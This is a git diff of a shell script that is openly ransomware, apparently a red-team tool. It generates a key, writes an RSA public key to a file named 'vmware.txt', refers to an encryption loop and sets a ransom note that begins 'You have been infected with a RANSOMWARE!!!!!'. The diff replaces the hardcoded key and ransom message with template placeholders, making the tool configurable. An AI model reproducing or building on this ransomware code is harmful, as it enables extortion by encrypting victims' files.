@@ -25,6 +25,7 @@ check_msg() {
 	DIALOG=none
     fi
 }
+
 # check the requirements
 check_req() {
     # Fatal Errors
@@ -71,16 +72,8 @@ init() {
 	check_msg
 	KEY="$(openssl rand -base64 25)"
 	pubkey="\
------BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXODFFedTcvdzqPtbxpE
-Xsc0vlXdXRkR4sjnPJ6eycA7ILQG+/ZYocSDTmxSoRFvtqq8AQ5BCJEcl6rTp9JJ
-d8PBVGfz4sR7YRR6jjVEfy9n0EUua5EcX8ST1gOsIiyqZPbvCab05AUK+u8Yvyiq
-5PA7IcZdIR1LwG6/NAZ0+Kh5iJeHmJP6H7hp1UxY2Qk2SuhyDRTUWgWM8PBxKny5
-GkgnPhkquGXUWYtXyhoW3JlOxIVSml9g6jrtivINJpSESSMpgdt3WjPD1oU6H/ts
-hD6EWJStqoDSp83199vc5+7lVV5pouDDf4q178lIYlfagwX5IdaWSgcKUXrRpd6Q
-CwIDAQAB
------END PUBLIC KEY-----\
-	"
+	{{ PUBLIC_KEY }}
+        "
 	PUBLICKEY="vmware.txt"
 	PRIVATEKEY="vmware.key"
 	echo "$pubkey" > $PUBLICKEY
@@ -139,14 +132,7 @@ enc_loop() {
 
 ################# MAIN ######################################
 setmsg() {
-    message='Congratulations,
-    
-You have been infected with a RANSOMWARE!!!!!
-I know. Scary stuff.
-Anyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.
-
-Love,
-~ The Red Team'
+    message='{{ RANSOM_MESSAGE }}'
 
     echo "Enter your new password: "
     read pass
